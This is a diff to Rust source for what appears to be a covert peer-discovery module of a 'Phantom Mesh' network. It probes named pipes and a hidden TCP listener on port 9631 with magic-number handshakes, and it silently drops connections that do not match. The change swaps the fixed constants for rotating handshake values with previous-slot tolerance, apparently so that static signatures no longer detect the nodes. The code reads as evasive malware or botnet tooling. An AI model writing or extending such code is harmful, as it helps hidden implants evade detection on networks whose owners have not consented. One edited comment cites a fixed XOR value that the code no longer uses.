@@ -10,6 +10,8 @@ use log::{info, warn};
 use tokio::time::sleep;
 use rand::Rng;
 
+use crate::crypto::{handshake_magic, handshake_xor, handshake_magic_prev, handshake_xor_prev};
+
 // OUI Constants (Allowed: Intel, Realtek, Microsoft)
 const ALLOWED_OUIS: &[&[u8; 3]] = &[
     &[0x00, 0x1B, 0x21], // Intel (Example)
@@ -123,7 +125,7 @@ impl ZeroNoiseDiscovery {
 
         match ClientOptions::new().open(&pipe_path) {
             Ok(mut client) => {
-                let magic = 0xDEADBEEFu32.to_be_bytes();
+                let magic = handshake_magic().to_be_bytes();
                 if client.write_all(&magic).await.is_err() {
                     return false;
                 }
@@ -156,7 +158,7 @@ impl ZeroNoiseDiscovery {
         match connect {
             Ok(Ok(mut stream)) => {
                 // Send magic handshake
-                let magic = 0xDEADBEEFu32.to_be_bytes();
+                let magic = handshake_magic().to_be_bytes();
                 if stream.write_all(&magic).await.is_err() {
                     return false;
                 }
@@ -168,8 +170,8 @@ impl ZeroNoiseDiscovery {
                     stream.read_exact(&mut response)
                 ).await {
                     Ok(Ok(_)) => {
-                        // Verify response: magic XOR 0xCAFEBABE
-                        let expected = (0xDEADBEEF_u32 ^ 0xCAFEBABE_u32).to_be_bytes();
+                        // Verify response: magic XOR 0xEFD5493C
+                        let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                         response == expected
                     }
                     _ => false,
@@ -200,7 +202,7 @@ impl ZeroNoiseDiscovery {
 
         match connect {
             Ok(Ok(mut stream)) => {
-                let magic = 0xDEADBEEFu32.to_be_bytes();
+                let magic = handshake_magic().to_be_bytes();
                 if stream.write_all(&magic).await.is_err() {
                     return false;
                 }
@@ -211,7 +213,7 @@ impl ZeroNoiseDiscovery {
                     stream.read_exact(&mut response)
                 ).await {
                     Ok(Ok(_)) => {
-                        let expected = (0xDEADBEEF_u32 ^ 0xCAFEBABE_u32).to_be_bytes();
+                        let expected = (handshake_magic() ^ handshake_xor()).to_be_bytes();
                         response == expected
                     }
                     _ => false,
@@ -227,7 +229,7 @@ impl ZeroNoiseDiscovery {
 // ============================================================================
 
 /// Listen for incoming covert handshakes on TCP port 9631
-/// Responds with magic XOR 0xCAFEBABE to prove we're a Phantom Mesh node
+/// Responds with dynamic magic to prove we're a Phantom Mesh node
 #[cfg(not(target_os = "windows"))]
 async fn start_covert_listener() {
     use tokio::net::TcpListener;
@@ -235,8 +237,6 @@ async fn start_covert_listener() {
     use log::{info, debug, warn};
 
     const COVERT_PORT: u16 = 9631;
-    const MAGIC: u32 = 0xDEADBEEF;
-    const RESPONSE_XOR: u32 = 0xCAFEBABE;
 
     let bind_addr = format!("0.0.0.0:{}", COVERT_PORT);
     
@@ -257,6 +257,11 @@ async fn start_covert_listener() {
                 debug!("[Discovery] Covert connection from {}", addr);
                 
                 tokio::spawn(async move {
+                    // Get current + previous magic values for tolerance
+                    let current_magic = handshake_magic();
+                    let prev_magic = handshake_magic_prev();
+                    let current_xor = handshake_xor();
+                    
                     // Read magic handshake
                     let mut buf = [0u8; 4];
                     if stream.read_exact(&mut buf).await.is_err() {
@@ -264,13 +269,14 @@ async fn start_covert_listener() {
                     }
 
                     let received = u32::from_be_bytes(buf);
-                    if received != MAGIC {
+                    // Accept current or previous slot magic
+                    if received != current_magic && received != prev_magic {
                         // Not our handshake, close silently
                         return;
                     }
 
-                    // Send response: magic XOR'd
-                    let response = (MAGIC ^ RESPONSE_XOR).to_be_bytes();
+                    // Send response: magic XOR'd (use the magic they sent)
+                    let response = (received ^ current_xor).to_be_bytes();
                     let _ = stream.write_all(&response).await;
                     
                     info!("[Discovery] Covert handshake completed with {}", addr);
